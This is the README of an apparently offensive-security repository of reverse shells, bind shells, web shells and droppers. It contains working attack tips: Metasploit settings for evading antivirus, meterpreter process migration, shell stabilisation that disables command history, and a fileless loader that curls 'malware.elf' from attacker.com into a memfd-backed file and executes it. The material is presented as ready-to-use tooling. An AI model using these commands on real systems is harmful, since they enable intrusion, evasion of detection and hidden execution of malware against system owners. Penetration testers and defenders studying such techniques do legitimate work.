# Shells

> A collection of reverse, bind and web shells from all over the internet.

Spotlight:

- [TCP reverse shell in C++ as Windows DLL](./reverse/connector/windows-cpp/)
- [TCP reverse shell with Cosmopolitan Libc](./reverse/connector/cosmopolitan/)
- [TCP reverse shell in Go](./reverse/connector/golang/)
- [Reverse shell listener with Tmux and Socat](./reverse/listener/tmux-socat-multiplexer/)
- [Python dropper utilizing `memfd_create()` on Linux](./dropper/memfd-create.py)
- [Python dropper that jumps to shellcode on Linux](./dropper/mmap-ctype.py)

## Usage

To interactively select and render one of the many templates run `./make.py`.

## Tips

### Metasploit

List available payload formats with `msfvenom --list formats`.

Payloads like `windows/shell_reverse_tcp` are one of the few reverse shells for Windows that support interactive commands.

Evade basic AV detection with `windows/meterpreter/reverse_http` ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)):

~~~
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoLoadStdapi false
~~~

After you received the meterpreter shell run `load stdapi`.

When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the meterpreter shell or `set AutoRunScript post/windows/manage/migrate` for the handler.

### Linux PTY

Spawn a PTY and stabilize your shell.

~~~ bash
python -c 'import pty;pty.spawn("/bin/bash")'
# ctrl+z
echo "stty sane;stty rows $LINES cols $COLUMNS;export TERM=xterm;" | xclip -sel clip
stty raw -echo
fg
# paste clipboard
# optional: disable history
unset HISTFILE
# optional: reset prompt
export PS1="$HOSTNAME> "; unset PROMPT_COMMAND
~~~

Alternate technique to spawn a PTY.

~~~ bash
script -q -c /bin/bash /dev/null
~~~

### Linux memfd_create()

Create file in memory with Python 3.8 or newer ([source](https://twitter.com/David3141593/status/1629691758563975168)).

~~~ python
import os
os.fork() or (os.setsid(), print(f'/proc/{os.getpid()}/fd/{os.memfd_create(str())}'), os.kill(os.getpid(), 19))
~~~

~~~ bash
path="$(python3 -c "from os import*;fork()or(setsid(),print(f'/proc/{getpid()}/fd/{memfd_create(sep)}'),kill(0,19))")"
curl -o $path https://attacker.com/malware.elf
$path
~~~
